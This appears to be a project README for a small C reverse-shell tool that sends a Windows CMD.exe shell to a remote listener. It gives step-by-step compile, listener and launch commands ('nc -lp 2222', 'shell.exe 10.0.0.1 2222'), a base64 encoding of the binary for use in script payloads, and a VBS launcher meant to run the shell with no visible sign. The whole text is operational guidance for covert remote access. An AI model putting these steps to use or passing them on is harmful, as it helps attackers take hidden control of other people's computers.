Simple (Windows) Reverse Shell (SRS)

Builds upon the work started by Ma~Far$ (a.k.a. Yahav N. Hoffmann)

Connect with me at: infoskirmish.com
=================
===== TL;DR =====
=================

SRS is a simple (58 formated lines - including comments) program written in C that when compiled will send a CMD.exe shell back to a server (reverse shell). SRS is designed to be executed on Windows and has been tested with NetCat as a listener. 

=========================
===== Prerequisites =====
=========================

Server (listener)
Tested with Ubuntu 16.04 (similar flavors will probably work)

mingw-w64 (apt-get install mingw-w64)
netcat (apt-get install netcat)

Client (sender)
Tested on Windows 10

==================================
===== Repo File Descriptions =====
==================================

256hash -> a 256 hash of the shell.exe binary.
md5hash -> a md5 hash of the shell.exe binary.
sha1hash -> a sha1 hash of the shell.exe binary.

compile.sh -> A linux shell script that will automate the compiling of shell.c (or whatever name you decide you want the executable to be). 

    requirements: compile.sh must have executable permissions. 
    use example: ./compile.sh shell
    NOTE: notice shell is missing the .c; if you add the .c the script will fail. 

shell.base -> A file that is created by compile.sh. This file contains a base64 encoded representation of the shell.exe binary. This is useful if you wish to include the binary as a script payload. Once uploaded/downloaded you will need a way to base64 decode the string and then write the output as binary to a file. 

shell.c -> The file which contains the SRS C source code. Note: you can rename this file to alter the name of the binary which compile.sh creates. 

    use example: rename shell.c to notes.c
                 run ./compile.sh notes
    You guessed it; you will end up with a notes.exe binary. 

run.vbs -> A proof of concept Visual Basic Script that shows you how to launch shell.exe with no windows popping up and no OBVIOUS indication anything was executed. 

    caveat: you will need to edit run.vbs to reflect the ip address and port you server will be using.

shell.exe -> The binary bread and butter. 
             use: shell.exe <ip address> <port>

=================
===== Usage =====
=================

Server Setup (listener)
    1) Install / verify you have the above prerequisites.
    2) Compile Source Code:

        ./compile.sh shell  
        NOTES: to change the name of the binary outcome change shell.c to <file>.c then
               run ./compile.sh <file> or you can simply just rename the binary once
               completed. 

    3) Upload or Download shell.exe to Windows 10 system
    4) Start Listening
    
         nc -lp 2222 
         NOTES: this assumes you are going to use port 2222. 

Client Setup (sender)

    1) Run Shell.exe

        Method 1: Open CMD
                  Navigate to folder holding shell.exe
                  Run: shell.exe 10.0.0.1 2222 
                  (replacing ip and port with that of the server)

                  On the server you should now have a reverse shell from the client.

         Method 2: Upload / Download run.vbs to the same folder as shell.exe
                   (replacing ip and port with that of the server)
                   Double-click on run.vbs

                   On the server you should now have a reverse shell from the client.

===============
===== FAQ =====
===============

Q: I upload shell.exe; navigate to folder, execute "shell.exe" nothing seems to happen and my server exits listening mode. 

A: SRS does not output anything. If SRS cannot connect or you do not supply the correct arguments then the program simply ends. If you simply run "shell.exe"; it is missing the server and port. The correct command would be: 

      shell.exe 10.0.0.1 2222

note there are no -p or -i simply the ip address and port.  

Q: What process is shown in task manager?

A: My results have shown that upon successful connection the only process which should be shown is a simple CMD background process. 


